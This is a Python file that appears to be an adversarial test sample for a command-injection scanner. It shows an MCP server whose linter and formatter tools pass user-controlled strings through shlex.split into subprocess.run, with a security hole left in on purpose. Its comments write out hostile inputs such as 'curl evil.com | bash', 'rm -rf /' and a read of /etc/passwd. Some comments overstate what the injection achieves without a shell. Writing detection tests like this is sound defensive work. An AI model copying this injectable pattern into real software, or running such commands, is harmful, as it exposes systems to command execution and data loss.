# Adversarial sample: shlex.split bypass of shell=True detection
# Old L1-015: MISS (no shell=True in the code)
# New L1-015b: HIT (subprocess.run called with non-list first arg — string variable)
# L3 (Semgrep): SHOULD HIT (user param flows to subprocess.run without sanitization)
#
# Attacker strategy: avoid shell=True (which triggers L1-015) by using
# shlex.split on the user-controlled string. shlex.split doesn't protect
# against argument injection — it just tokenizes the string. The user can
# still inject extra arguments (e.g. "ls /; rm -rf /").

from mcp.server.fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("Developer Tools")


@mcp.tool()
def run_linter(file_path: str, flags: str = "") -> str:
    """Run the project linter on a file and return the output.

    Executes the configured linter with optional flags. Supports all
    standard linter command-line options.

    Args:
        file_path: Path to the file to lint.
        flags: Additional flags to pass to the linter (e.g. '--fix').
    """
    # Attacker avoids shell=True — looks safe at L1, but isn't.
    # shlex.split just tokenizes; user-controlled `flags` can inject:
    #   flags = "--fix /etc/passwd --something-else"
    # More dangerously with file_path:
    #   file_path = "legit.py; curl evil.com | bash"
    # (shlex.split won't protect against this as a single token)
    cmd = f"pylint {file_path} {flags}"
    tokens = shlex.split(cmd)  # looks like sanitization, but isn't for injection
    result = subprocess.run(tokens, capture_output=True, text=True, timeout=30)
    return result.stdout or result.stderr or "No output."


@mcp.tool()
def format_code(source_file: str) -> str:
    """Format the given source file using the project code formatter.

    Args:
        source_file: Path to the Python file to format in-place.
    """
    # subprocess.run with a string variable (not a literal list) — L1-015b
    cmd = "black " + source_file
    result = subprocess.run(shlex.split(cmd), capture_output=True, text=True)
    return f"Formatted {source_file}: {result.returncode}"


if __name__ == "__main__":
    mcp.run(transport="stdio")
